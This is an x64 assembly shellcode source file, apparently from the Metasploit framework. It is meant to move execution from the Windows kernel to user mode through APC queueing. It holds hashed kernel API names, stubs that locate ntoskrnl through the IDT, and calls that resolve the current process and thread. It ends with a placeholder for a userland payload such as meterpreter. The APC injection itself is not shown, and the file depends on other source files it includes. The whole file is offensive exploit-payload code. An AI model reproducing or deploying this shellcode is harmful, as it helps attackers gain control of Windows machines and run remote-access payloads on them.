;
; Windows x64 Kernel Ring 0 to Ring 3 via Insert Queue APC Shellcode
;
; Author: Sean Dillon <sean.dillon@risksense.com> (@zerosum0x0)
; License: MSF License
;
; Acknowledgements: Stephen Fewer, skape, Equation Group
;

[BITS 64]
[ORG 0]

PSGETCURRENTPROCESS_HASH              equ      0x8f8f1b7e   ; hash("PsGetCurrentProcess")
PSLOOKUPPROCESSBYID_HASH              equ      0xa194b248   ; hash("PsLookupProcessById")
PSGETPROCESSIMAGEFILENAME_HASH        equ      0x8be7eeec   ; hash("PsGetProcessImageFileName")
KEGETCURRENTPROCESS_HASH              equ      0x8e4f1b0e   ; hash("KeGetCurrentProcess")
KEGETCURRENTTHREAD_HASH               equ      0xe932d23c   ; hash("KeGetCurrentThread")
KEINITIALIZEAPC_HASH                  equ      0x2b988da3   ; hash("KeInitializeApc")
KEINSERTQUEUEAPC_HASH                 equ      0x88c695f9   ; hash("KeInsertQueueApc")
ZWALLOCATEMEMORY_HASH                 equ      0xe18775c7   ; hash("ZwAllocateMemory")
EXALLOCATEPOOL_HASH                   equ      0x3707e062   ; hash("ExAllocatePool")
OBFDEREFERENCEOBJECT_HASH             equ      0x32c5ddf6   ; hash("ObfDereferenceObject")

  ; cld

  push rsp
  and sp, 0xFFF0                                    ; align stack
  push rsi                                          ; save clobbered registers
  push r14                                          ; r14 will store ntoskernl.exe

  jmp inject_start                                  ; proceed past helper functions

%include "./src/kernel/call_kernel_api.asm"

inject_start:


%include "./src/kernel/find_nt_idt.asm"             ; this stub loads ntoskrnl.exe into rax

  mov r14, rax
  mov r11d, PSGETCURRENTPROCESS_HASH
  call kernel_api_call
  mov r13, rax

  mov rax, r14
  mov r11d, KEGETCURRENTTHREAD_HASH
  call kernel_api_call
  mov r12, rax

inject_end:

  pop r14
  pop rsi                                           ; restore clobbered registers and return
  pop rsp
  ret

userland_start:

%include "./src/single/createthread.asm"

userland_payload:
  ; insert user land payload here
  ; such as meterpreter
  ; or reflective dll with the metasploit MZ pre-stub
